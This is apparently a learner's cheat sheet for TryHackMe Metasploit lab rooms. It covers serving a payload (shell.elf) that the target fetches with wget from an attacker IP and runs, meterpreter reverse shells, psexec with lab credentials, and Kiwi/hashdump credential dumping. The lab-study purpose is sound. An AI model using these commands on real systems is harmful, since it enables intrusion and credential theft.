# Things I Had to Look Up — Metasploit Rooms

## Fixing Broken Metasploit (bootsnap symlink error)
```bash
sudo rm -rf /usr/lib/llvm-*/build
sudo msfconsole
```
**Why:** Broken circular symlinks in llvm directories cause bootsnap to loop infinitely. Wildcard removes all versions at once.

---

## VPN / LHOST Issues
- `10.0.2.15` = VirtualBox NAT address — target can't reach you on this
- `set LHOST tun0` — lets Metasploit auto-detect your VPN interface IP
- If reverse shell keeps failing from local Kali, use the AttackBox — routing issues between your `192.168.x.x` VPN IP and THM's `10.x.x.x` targets

---

## Keeping a Linux Payload Alive
```bash
nohup ./shell.elf &
```
- `nohup` — prevents process dying when terminal closes
- `&` — runs in background
- Without these, meterpreter session dies immediately on Linux targets

---

## Serving a File to a Target
```bash
# On your attacking machine
python3 -m http.server 9000

# On the target machine
wget http://YOUR_IP:9000/shell.elf
chmod +x shell.elf
```

---

## Dumping Hashes on Linux (hashdump is Windows only)
```bash
run post/linux/gather/hashdump
```

---

## Finding Post Exploitation Modules
```bash
# Search by keyword inside msfconsole
search type:post shares
search type:post hashdump
search type:post gather
```
Pattern: `run post/[os]/gather/[module_name]`

---

## Finding Files in Meterpreter
```bash
search -f secrets.txt          # exact filename
search -f *secret*             # wildcard — finds realsecret.txt, secrets.txt, etc.
search -f flag.txt
```
**Note:** Slow on THM AttackBox — filesystem-wide search takes time.

---

## Reading Files with Spaces in Path
```bash
# Wrong
cat c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt

# Right — use quotes and forward slashes
cat "c:/Program Files (x86)/Windows Multimedia Platform/secrets.txt"
```

---

## Cracking Hashes Without John/Hashcat
- **https://crackstation.net** — paste NTLM hash, get cleartext instantly
- Works for common/CTF passwords via rainbow table lookup
- Use John or Hashcat when crackstation comes back empty

---

## Getting In With Credentials (psexec)
```bash
use exploit/windows/smb/psexec
set RHOSTS TARGET_IP
set SMBUser ballen
set SMBPass Password1
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
run
```
Use when you have valid credentials but no vulnerability to exploit.

---

## Kiwi — Credential Dumping Extension
```bash
load kiwi
creds_all          # dump everything at once
lsa_dump_sam       # dump SAM database
lsa_dump_secrets   # dump LSA secrets
wifi_list          # list saved WiFi passwords
```
Kiwi is Mimikatz built into Meterpreter — more powerful than hashdump for Windows targets.

---

## Staged Payload Execution Order
1. Exploit delivers the small stager to target
2. Stager establishes connection back to attacker
3. Stage payload is downloaded through the connection
4. Full payload executes on the target system

---

## Reading Error Messages
When Metasploit throws an error, the path in the error message tells you exactly what's broken.
- Read the path
- Identify what's wrong (permissions, missing file, circular symlink)
- Fix the specific thing
- Wildcard (`*`) when the same error repeats with incremented numbers
